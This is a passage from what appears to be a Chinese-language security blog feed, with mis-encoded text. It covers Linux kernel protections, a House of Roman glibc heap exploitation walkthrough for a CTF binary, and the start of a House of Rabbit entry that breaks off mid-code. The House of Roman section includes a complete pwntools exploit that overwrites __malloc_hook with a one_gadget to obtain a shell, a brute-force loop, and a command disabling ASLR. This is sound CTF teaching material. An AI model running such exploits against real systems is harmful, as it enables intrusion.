¸ç©ºé—´å†…å­˜çš„é¡µè¡¨ï¼Œå¦‚ç”¨äºå¤„ç†ç³»ç»Ÿè°ƒç”¨ã€ä¸­æ–­ç­‰ä¿¡æ¯çš„å†…å­˜ã€‚</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemuå¼€å¯smep -append â€kpti=1â€œ</span><br><span class="line">    å…³é—­   -append â€noptiâ€œ</span><br></pre></td></tr></table></figure><p>Linux 4.15 ä¸­å¼•å…¥äº† KPTI æœºåˆ¶ï¼Œå¹¶ä¸”è¯¥æœºåˆ¶è¢«åå‘ç§»æ¤åˆ°äº† Linux 4.14.11ï¼Œ4.9.75ï¼Œ4.4.110</p><h3 id="è®¿é—®æ§åˆ¶"><a href="#è®¿é—®æ§åˆ¶" class="headerlink" title="è®¿é—®æ§åˆ¶"></a>è®¿é—®æ§åˆ¶</h3><h4 id="dmesg-restrict"><a href="#dmesg-restrict" class="headerlink" title="dmesg_restrict"></a>dmesg_restrict</h4><p><code>/proc/sys/kernel/dmesg_restrict</code></p><p>è¯¥é€‰é¡¹ç”¨äºæ§åˆ¶æ˜¯å¦å¯ä»¥ä½¿ç”¨ <code>dmesg</code> æ¥æŸ¥çœ‹å†…æ ¸æ—¥å¿— </p><ul><li>0 æ²¡æœ‰ä»»ä½•é™åˆ¶</li><li>1 åªæœ‰å…·æœ‰ <code>CAP_SYSLOG</code> æƒé™çš„ç”¨æˆ·æ‰å¯ä»¥é€šè¿‡ <code>dmesg</code> å‘½ä»¤æ¥æŸ¥çœ‹å†…æ ¸æ—¥å¿—ã€‚</li></ul><h4 id="kptr-restrict"><a href="#kptr-restrict" class="headerlink" title="kptr_restrict"></a>kptr_restrict</h4><p> <code>/proc/sys/kernel/kptr_restrict</code></p><p>è¯¥é€‰é¡¹ç”¨äºæ§åˆ¶åœ¨è¾“å‡ºå†…æ ¸åœ°å€æ—¶æ–½åŠ çš„é™åˆ¶,å¦‚é€šè¿‡&#x2F;proc</p><ul><li>0ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œæ²¡æœ‰ä»»ä½•é™åˆ¶ã€‚</li><li>1ï¼šä½¿ç”¨ <code>ï¼…pK</code> è¾“å‡ºçš„å†…æ ¸æŒ‡é’ˆåœ°å€å°†è¢«æ›¿æ¢ä¸º 0ï¼Œé™¤éç”¨æˆ·å…·æœ‰ CAP_SYSLOG ç‰¹æƒï¼Œå¹¶ä¸” group id å’ŒçœŸæ­£çš„ id ç›¸ç­‰ã€‚</li><li>2ï¼šä½¿ç”¨ <code>ï¼…pK</code> è¾“å‡ºçš„å†…æ ¸æŒ‡é’ˆéƒ½å°†è¢«æ›¿æ¢ä¸º 0 ï¼Œå³ä¸æƒé™æ— å…³ã€‚</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House Of Roman</title>
      <link href="/2023/08/06/House-Of-Roman/"/>
      <url>/2023/08/06/House-Of-Roman/</url>
      
        <content type="html"><![CDATA[<p>fastbin attack å’Œ Unsortbin attack ç»“åˆçš„bypass ALSRï¼Œåˆ©ç”¨ 12-bit çš„çˆ†ç ´ï¼Œåœ¨æœ‰uafå’Œoff by oneä½†æ²¡åŠæ³•æ³„éœ²åœ°å€æ—¶ï¼Œ<strong>å±€éƒ¨å†™ å‡å°‘éšæœºåŒ–çš„ç¨‹åº¦ï¼Œä»è€Œç»™å‡ºçˆ†ç ´çš„å¯èƒ½</strong></p><h2 id="demoåˆ†æ"><a href="#demoåˆ†æ" class="headerlink" title="demoåˆ†æ"></a>demoåˆ†æ</h2><p><a href="https://github.com/romanking98/House-Of-Roman">https://github.com/romanking98/House-Of-Roman</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/c/p/h/House-Of-Roman&gt; checksec ./new_chall </span><br><span class="line">[*] &#x27;/mnt/hgfs/share/ctfwiki/pwn/heap/House-Of-Roman/new_chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>write_chunkæœ‰off by one</p><p>free_chunkæœ‰uaf å’Œ double free</p><p>æ€è·¯å¤§è‡´å°±æ˜¯ä¸‹é¢ä¸¤ä¸ªæ–¹é¢</p><ul><li><p>åˆ©ç”¨unsortedbin attach å¾€malloc_hooké‡Œå†™å…¥unsortedbinçš„å€¼</p></li><li><p>åˆ©ç”¨fastbin attachæ¥æ§åˆ¶malloc_hookï¼Œ12bitå±€éƒ¨å†™malloc_hooké‡Œunsortedbinçš„å€¼ä¸ºogg</p></li></ul><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="number">0</span>) # <span class="number">0x20</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) # d0</span><br><span class="line"><span class="title function_">create</span><span class="params">(<span class="number">0x68</span>,<span class="number">2</span>)</span>  # 0x70</span><br><span class="line"></span><br><span class="line">fake = b<span class="string">&quot;A&quot;</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x71</span>)  #<span class="meta"># fake size</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæŠŠchunk1+0x78å¤„å†™ä¸Šsize0x71ç”¨äºåé¢fastbinattach</p><p><img src="/2023/08/06/House-Of-Roman/image-20230807144531230.png" alt="image-20230807144531230"></p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)æŠŠunsortbinå†™å…¥</span><br></pre></td></tr></table></figure><p><img src="/2023/08/06/House-Of-Roman/image-20230807144800100.png" alt="image-20230807144800100"></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create(0x68,3)  # b</span><br><span class="line">create(0x68,15)</span><br><span class="line">create(0x68,18)</span><br><span class="line">over = b&quot;A&quot;*0x18  # off by one</span><br><span class="line">over += b&quot;\x71&quot;  # set chunk  1&#x27;s size --&gt; 0x71</span><br><span class="line">edit(0,over)</span><br><span class="line">free(2)</span><br><span class="line">free(3)</span><br><span class="line">heap_po = b&quot;\x20&quot;</span><br><span class="line"># b()</span><br><span class="line">edit(3,heap_po)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨off by oneå’ŒuafæŠŠchunk1æ”¾åˆ°fastbiné“¾è¡¨</p><p><img src="/2023/08/06/House-Of-Roman/image-20230807145444749.png" alt="image-20230807145444749"></p><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc_hook_nearly = <span class="string">b&quot;\xed\x1a&quot;</span></span><br><span class="line">edit(<span class="number">1</span>,malloc_hook_nearly)</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;__malloc_hook</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (void *(**)(size_t, const void *)) 0x7ffff7dd1b10 &lt;__malloc_hook&gt;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">find_fake_fast 0x7ffff7dd1b10 0x70</span></span><br><span class="line">FAKE CHUNKS</span><br><span class="line">Fake chunk | Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: 0x7ffff7dd1aed</span><br><span class="line">prev_size: 0x-822fda0000000</span><br><span class="line">size: 0x7f</span><br><span class="line">fd: 0x-856d160000000</span><br><span class="line">bk: 0x-856d58fffff81</span><br><span class="line">fd_nextsize: 0x7f</span><br><span class="line">bk_nextsize: 0x00</span><br></pre></td></tr></table></figure><p>åœ¨mallochookä¸Šæ–¹æ‰¾ä¸€ä¸ªå¯ä»¥ç»•è¿‡å¤§å°æ£€æµ‹çš„å †å—ï¼Œåˆ©ç”¨uafæŠŠä»–é“¾å…¥fastbiné‡Œ</p><p><img src="/2023/08/06/House-Of-Roman/image-20230807145855329.png" alt="image-20230807145855329"></p><p>ç„¶åå°±å¯ä»¥ç”³è¯·å‡ºæ¥0x7ffff7dd1aedæ§åˆ¶mallochookå€¼äº†</p><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(15)</span><br><span class="line">edit(15,p64(0x00))</span><br></pre></td></tr></table></figure><p>ç”¨æ¥æŠŠåæ‰çš„fastbinä¿®å¤</p><h3 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h3><p>æ¥ä¸‹æ¥å°±æ˜¯unsortedbinæ”»å‡»</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">4</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">po = b<span class="string">&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line">po += b<span class="string">&quot;\x00\x1b&quot;</span> #malloc_hook0x7ffff7dd1b10<span class="number">-0x10</span>çš„ä½ç½®</span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/08/06/House-Of-Roman/image-20230807150730458.png" alt="image-20230807150730458"></p><p><img src="/2023/08/06/House-Of-Roman/image-20230807150811005.png" alt="image-20230807150811005"></p><p>ç„¶åcreate(0xc8,1)æŠŠbck-&gt;fd  å³malloc_hooké‡Œå†™å…¥unsorted_chunksçš„å€¼</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd                 = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><h3 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">over = b<span class="string">&quot;R&quot;</span>*<span class="number">0x13</span>   <span class="meta"># padding for malloc_hook</span></span><br><span class="line">over += b<span class="string">&quot;\xa4\xd3\xaf&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line">b()</span><br><span class="line"><span class="built_in">free</span>(<span class="number">18</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">18</span>)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ä¹‹å‰ç”³è¯·åˆ°çš„åŒ…å«malloc-hookçš„å †æ¥ä¿®æ”¹unsorted_chunksä¸ºoggï¼Œfreeæ—¶è§¦å‘malloc_printerr ä»è€Œè§¦å‘mallochookçš„ogg</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>åœ¨ç¬¬å››æ­¥malloc_hookå’Œç¬¬ä¸ƒæ­¥çš„oggæ—¶éœ€è¦çˆ†ç ´çš„ï¼Œç”±äºaslræŒ‰ç…§é¡µæ¥éšæœºï¼Œæ‰€ä»¥åé¢12bitçš„æ•°å­—æ˜¯ä¸å˜çš„ï¼Œæˆ‘ä»¬åˆ†ææ—¶å°†aslrå…³é—­<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>,å†™å®Œexpåå†æ‰“å¼€è¿è¡Œå¤šæ¬¡expï¼Œå°±ä¼šæœ‰æœºç‡çˆ†ç ´åˆ°åœ°å€ä¸€æ ·çš„æƒ…å†µ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for i in `seq 1 5000`; do python exp.py; done;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn</span><br><span class="line"><span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./new_chall&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;3. Free&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,idx</span>):</span><br><span class="line">    menu()</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    menu()</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,data</span>):</span><br><span class="line">    menu()</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line">name = <span class="string">b&quot;A&quot;</span>*<span class="number">20</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x0ACF&#x27;)#edit</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x931&#x27;)#free</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">0</span>) <span class="comment"># 0x20</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># d0</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">2</span>)  <span class="comment"># 0x70</span></span><br><span class="line"></span><br><span class="line">fake = <span class="string">b&quot;A&quot;</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x71</span>)  <span class="comment">## fake size</span></span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line"><span class="comment">##freeæ‰1åˆ°unsortbinï¼Œå†ç”³è¯·å‡ºæ¥å°±ä¼šæœ‰unsortedbinåœ°å€</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">3</span>)  <span class="comment"># b</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">15</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">18</span>)</span><br><span class="line">over = <span class="string">b&quot;A&quot;</span>*<span class="number">0x18</span>  <span class="comment"># off by one</span></span><br><span class="line">over += <span class="string">b&quot;\x71&quot;</span>  <span class="comment"># set chunk  1&#x27;s size --&gt; 0x71</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#åˆ©ç”¨uafæŠŠå †å—1é“¾å…¥fastbiin</span></span><br><span class="line">heap_po = <span class="string">b&quot;\x20&quot;</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br><span class="line"><span class="comment">#ä¿®æ”¹fdä¸ºmallochookä¸Šæ–¹</span></span><br><span class="line">malloc_hook_nearly = <span class="string">b&quot;\xed\x1a&quot;</span></span><br><span class="line">edit(<span class="number">1</span>,malloc_hook_nearly)</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#æŠŠmallochookåŒ…å«åˆ°å †å—é‡Œ</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#ä¿®å¤åæ‰çš„fastbin</span></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x0ACF&#x27;)#edit</span></span><br><span class="line">edit(<span class="number">15</span>,p64(<span class="number">0x00</span>))</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">4</span>)</span><br><span class="line"><span class="comment"># unsortedbin attach</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">po = <span class="string">b&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line">po += <span class="string">b&quot;\x00\x1b&quot;</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x0ACF&#x27;)#edit</span></span><br><span class="line">dbpie(<span class="string">&#x27;0x09B8&#x27;</span>)<span class="comment">#malloc</span></span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ©ç”¨ä¹‹å‰ç”³è¯·çš„åŒ…å«mallochookçš„å †å—å»å±€éƒ¨è¦†å†™malloc_hook</span></span><br><span class="line">over = <span class="string">b&quot;R&quot;</span>*<span class="number">0x13</span>   <span class="comment"># padding for malloc_hook</span></span><br><span class="line">over += <span class="string">b&quot;\xa4\xd2\xaf&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">ru(<span class="string">b&#x27;***\n&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    resp = io.recv(<span class="number">4</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string">0x7ffff7a52226</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">0x7ffff7a5227a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">0x7ffff7afd3a4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">0x7ffff7afe247</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/08/06/House-Of-Roman/image-20230807161504915.png" alt="image-20230807161504915"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Rabbit</title>
      <link href="/2023/08/05/House-of-Rabbit/"/>
      <url>/2023/08/05/House-of-Rabbit/</url>
      
        <content type="html"><![CDATA[<p>è¿ç”¨åœ¨ fastbin attack </p><ul><li>å¯ä»¥ä¿®æ”¹fastbinçš„fdæŒ‡é’ˆæˆ–size</li><li>å¯ä»¥è§¦å‘malloc consolidateï¼Œmalloc consolidateä¼šæŠŠfastbinçš„å †å—æ ¹æ®å‘¨å›´å †å—çŠ¶æ€è¿›è¡Œåˆå¹¶ï¼Œæ”¾å…¥åˆé€‚çš„biné‡Œ</li></ul><p> house of rabbit åˆ©ç”¨äº†åœ¨ malloc consolidate çš„æ—¶å€™ fastbin ä¸­çš„å †å—è¿›è¡Œåˆå¹¶æ—¶ size æ²¡æœ‰è¿›è¡Œæ£€æŸ¥</p><h2 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h2><p>æµ‹è¯•ç¯å¢ƒ2.23</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk4;</span><br><span class="line">    <span class="type">void</span>* dummies[<span class="number">7</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    chunk4 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// è§¦å‘fastbinåˆå¹¶</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> chunk4 &#x3D; malloc(0x1000)å‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x602050 â€”â–¸ 0x602000 â—‚â€” 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x602050</span></span><br><span class="line">00:0000â”‚     0x602050 â—‚â€” 0x0</span><br><span class="line">01:0008â”‚     0x602058 â—‚â€” 0x51 /* &#x27;Q&#x27; */</span><br><span class="line">02:0010â”‚ r8  0x602060 â€”â–¸ 0x602000 â—‚â€” 0x0</span><br><span class="line">03:0018â”‚     0x602068 â—‚â€” 0x0</span><br></pre></td></tr></table></figure><p> chunk4 &#x3D; malloc(0x1000)å</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0: 0x602000 â€”â–¸ 0x7ffff7dd1c08 (main_arena+232) â—‚â€” 0x602000</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x602000</span></span><br><span class="line">00:0000â”‚   0x602000 â—‚â€” 0x0</span><br><span class="line">01:0008â”‚   0x602008 â—‚â€” 0xa1</span><br><span class="line">02:0010â”‚   0x602010 â€”â–¸ 0x7ffff7dd1c08 (main_arena+232) â€”â–¸ 0x7ffff7dd1bf8 (main_arena+216) â€”â–¸ 0x7ffff7dd1be8 (main_arena+200) â€”â–¸ 0x7ffff7dd1bd8 </span><br></pre></td></tr></table></figure><h3 id="ä¿®æ”¹size"><a href="#ä¿®æ”¹size" class="headerlink" title="ä¿®æ”¹size"></a>ä¿®æ”¹size</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* 